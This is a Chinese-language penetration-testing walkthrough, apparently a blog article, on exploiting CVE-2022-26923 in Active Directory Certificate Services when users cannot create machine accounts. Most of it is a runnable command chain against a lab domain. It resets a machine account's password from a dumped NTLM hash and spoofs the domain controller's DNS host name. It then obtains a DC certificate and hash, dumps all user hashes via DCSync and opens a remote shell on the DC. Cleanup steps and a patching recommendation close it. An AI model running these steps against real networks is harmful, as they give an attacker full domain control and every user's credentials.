## 零、漏洞回顾

Active Directory 域权限提升漏洞(CVE-2022-26923 )，允许低权限用户在安装了 Active Directory 证书服务
(AD CS) 服务器角色的默认 Active Directory 环境中将权限提升到域管理员。

## 一、场景

MAQ，即MS-DS-Machine-Account-Quota，此属性是允许域普通用户在域中创建的机器帐户的数量。

一般普通域用户可以新建10个机器账户，即MAQ=10。但是如果你进到一个域环境，发现当前域不允许新建机器账户（MAQ=0），也没有任何机器账户的权限，仅有域内普通账户权限一枚。这种情况下，如何利用
CVE-2022-26923 Windows Active Directory 域服务组件权限提升这个漏洞呢？

查看MAQ的值：

    
    
    python3 bloodyAD.py -d pentest.com -u saul -p 'admin!@#45' --host 10.10.100.8 getObjectAttributes 'DC=pentest,DC=com' ms-DS-MachineAccountQuota
    
    {
        "ms-DS-MachineAccountQuota": 0
    }
    

## 二、思路

 **简单来说就是不允许新建，那就利用已有的机器账户。**

一般域内普通账户拥有修改其对应机器账户的密码的权限，所以我们拥有域内普通用户凭据的情况下，可以查看是否有机器账户，我们通过修改其属性，然后就可以利用域内普通账户去执行后续的利用步骤。

 **那么我们怎么在只有域内普通账户权限、不知道机器账户原有密码的情况下，重置或修改其密码呢？**

## 三、具体攻击步骤

### 1\. 准备工作

#### 环境简述

  * 域内普通用户：saul

  * 域内机器账户：win10-x64-test$

  * 域控：DC.pentest.com，机器IP：10.10.100.8

#### 域内定位CA主机，

在域内机器上执行，

    
    
    certutil -config - -ping
    

![定位CA](https://image.3001.net/images/20220602/1654178800_6298c3f03c0d274905b75.png!small)  
注意，该命令会在查询的机器上面弹出窗口。

![img](https://image.3001.net/images/20220602/1654178800_6298c3f0b15c7fc153ca6.png!small)

#### 查看当前域普通用户的机器账户，

假如已获取saul这个普通域用户的权限，查询`objectSid`：，

![img](https://image.3001.net/images/20220602/1654178801_6298c3f1382f81778aaa2.png!small)

查询当前hostname，

![img](https://image.3001.net/images/20220602/1654178801_6298c3f18793e0a0cbf99.png!small)

一般机器用户就是`hostname`加$，即`win10-x64-test$`

#### 查看并保存此机器账户的 SPN，

查看原来的SPN，

![img](https://image.3001.net/images/20220602/1654178801_6298c3f1e62a9b9a99759.png!small)

mark一下，方便后续恢复使用。

    
    
    RestrictedKrbHost/WIN10-X64-TEST
    HOST/WIN10-X64-TEST
    RestrictedKrbHost/win10-x64-test.pentest.com
    HOST/win10-x64-test.pentest.com
    

### 2\. 修改机器账户的密码

#### 查看机器账户的属性，

![img](https://image.3001.net/images/20220602/1654178802_6298c3f252c7357d30127.png!small)

saul可以修改其密码，

而其实Everyone均可修改，

![img](https://image.3001.net/images/20220602/1654178802_6298c3f2e3861dcf7b59d.png!small)

#### 修改密码的前提条件，

NTLM hash或密码至少知道一个，但我们就是不知道密码，所以还是要去抓hash。提权至管理员，抓取hash。

![img](https://image.3001.net/images/20220602/1654178803_6298c3f3652a1a5eb73bc.png!small)

`WIN10-X64-TEST$`的NTLM hash为。

    
    
    78e9bf4a8b67e1d5f1effe39622b548a
    

#### 利用SAMR协议修改密码和相关工具，

这里用到了一个工具：changentlm.py。利用SAMR协议修改密码，需要知道NTLM hash或密码。现在有了NTLM
hash，不知道明文密码也可以修改密码。

参考：

https://github.com/SecureAuthCorp/impacket/pull/1097

https://github.com/SecureAuthCorp/impacket/pull/1097/files

#### 尝试修改密码：

    
    
    python3 changentlm.py pentest/saul:'admin!@#45' -user win10-x64-test$ -server DC -old-ntlm 78e9bf4a8b67e1d5f1effe39622b548a -new-pass NewPassw0rd -dc-ip 10.10.100.8
    

修改成功！此时机器账户的密码已被修改为NewPassw0rd。

![img](https://image.3001.net/images/20220602/1654178803_6298c3f3e50ca78001472.png!small)

### 3\. 具体利用过程

#### 修改机器账户的`servicePrincipalName`

其实就是删除`WIN10-X64-TEST$`账户中包含`dNSHostName`的`servicePrincipalName`属性值。

    
    
    python3 bloodyAD.py -d pentest.com -u saul -p 'admin!@#45' --host DC.pentest.com setAttribute 'CN=WIN10-X64-TEST,CN=Computers,DC=pentest,DC=com' servicePrincipalName '["RestrictedkrbHost/WIN10-X64-TEST","HOST/WIN10-X64-TEST"]'
    

![img](https://image.3001.net/images/20220602/1654178804_6298c3f48097688dd2a6a.png!small)

#### 修改机器账户的`DNSHostName`

    
    
    python3 bloodyAD.py -d pentest.com -u saul -p 'admin!@#45' --host DC.pentest.com setAttribute 'CN=WIN10-X64-TEST,CN=Computers,DC=pentest,DC=com' DNSHostName '["DC.pentest.com"]'
    

![img](https://image.3001.net/images/20220602/1654178804_6298c3f4f057976f07385.png!small)

成功修改。

![img](https://image.3001.net/images/20220602/1654178805_6298c3f57061a21e1b55e.png!small)

#### 通过certipy工具申请证书，

通过 certipy 工具，为该机器账号申请证书，可以看到申请的证书是颁发给主机 DC.pentest.com 的，也就是说我们拿到了域控的证书：

    
    
    certipy req pentest/WIN10-X64-TEST$:NewPassw0rd@DC -ca pentest-DC-CA -template Machine -dc-ip 10.10.100.8 -debug
    

![img](https://image.3001.net/images/20220602/1654178805_6298c3f5eeb4b92168497.png!small)

#### 使用certipy工具获取域控的NT hash值。

    
    
    certipy auth -pfx dc.pfx -username DC$ -domain pentest.com -dc-ip 10.10.100.8
    

![img](https://image.3001.net/images/20220602/1654178806_6298c3f677731a9c75db0.png!small)

#### 转储用户hash（可选），

再利用 NT hash 值执行DCSync转储所有用户的hash：

    
    
    python3 secretsdump.py pentest.com/DC\$@DC -hashes :63c12b7872c72069402b5443f10985b6
    

![img](https://image.3001.net/images/20220602/1654178807_6298c3f71a9a8a1c73207.png!small)

#### 获取域控权限，

wmiexec或smbexec都行，下面使用smbexec获取域控权限。

    
    
    cp ./dc.ccache /tmp/
    KRB5CCNAME='/tmp/dc.ccache' proxychains4 python3 smbexec.py -target-ip 10.10.100.8 -dc-ip 10.10.100.8 -k -no-pass @'DC.pentest.com'
    

![img](https://image.3001.net/images/20220602/1654178807_6298c3f7e04c997ef22e7.png!small)

## 四、善后措施

### 恢复机器账户的 DNSHostName

命令如下：

    
    
    python3 bloodyAD.py -d pentest.com -u saul -p 'admin!@#45' --host DC setAttribute 'CN=WIN10-X64-TEST,CN=Computers,DC=pentest,DC=com' DNSHostName '["WIN10-X64-TEST.pentest.com"]'
    

查询

    
    
    python3 bloodyAD.py -d pentest.com -u saul -p 'admin!@#45' --host 10.10.100.8 getObjectAttributes 'CN=WIN10-X64-TEST,CN=Computers,DC=pentest,DC=com' dNSHostName
    

成功

![img](https://image.3001.net/images/20220602/1654178808_6298c3f89bc8e29d115d3.png!small)

### 恢复机器账户的 SPN

攻击完成没有恢复 SPN 的话会出现信任关系丢失的情况。命令如下：

    
    
    python3 bloodyAD.py -d pentest.com -u saul -p 'admin!@#45' --host DC setAttribute 'CN=WIN10-X64-TEST,CN=Computers,DC=pentest,DC=com' servicePrincipalName '["RestrictedkrbHost/WIN10-X64-TEST","HOST/WIN10-X64-TEST","RestrictedKrbHost/win10-x64-test.pentest.com","HOST/win10-x64-test.pentest.com"]'
    

查询

    
    
    python3 bloodyAD.py -d pentest.com -u saul -p 'admin!@#45' --host 10.10.100.8 getObjectAttributes 'CN=WIN10-X64-TEST,CN=Computers,DC=pentest,DC=com' servicePrincipalName
    

成功修改

![img](https://image.3001.net/images/20220602/1654178809_6298c3f925bde88e389fc.png!small)

### 恢复机器账户的密码

命令如下：

    
    
    python3 changentlm.py pentest/saul:'admin!@#45' -user win10-x64-test$ -server DC -old-pass NewPassw0rd -new-ntlm 78e9bf4a8b67e1d5f1effe39622b548a -dc-ip 10.10.100.8
    

![img](https://image.3001.net/images/20220602/1654178809_6298c3f9e94c83ac7aeca.png!small)

## 五、总结

将域控的MAQ值设置为0，即不允许域内普通用户新建机器账户，只能算是一种缓解措施，因为攻击者可以利用已有的机器账户进行攻击，而不需要新建一个机器账户。及时打补丁和升级才是最稳妥的措施。

之前的CVE-2021-42278和CVE-2021-42287的漏洞也可以利用此思路来利用。

* * *

 **由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用本人负责，文章作者不为此承担任何责任。**

